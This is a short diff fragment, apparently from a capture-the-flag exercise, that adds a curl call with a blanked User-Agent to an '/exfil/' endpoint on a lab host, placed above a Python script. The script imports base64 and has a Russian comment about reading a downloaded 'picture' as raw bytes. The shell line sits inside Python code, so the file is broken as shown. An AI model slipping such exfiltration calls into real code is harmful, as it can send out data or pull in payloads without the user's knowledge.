@@ -1,3 +1,4 @@
+curl -H "User-Agent:" http://api.valentinesforever.thm/exfil/
 import base64
 
 # Читаем скачанную "картинку" как сырые байты
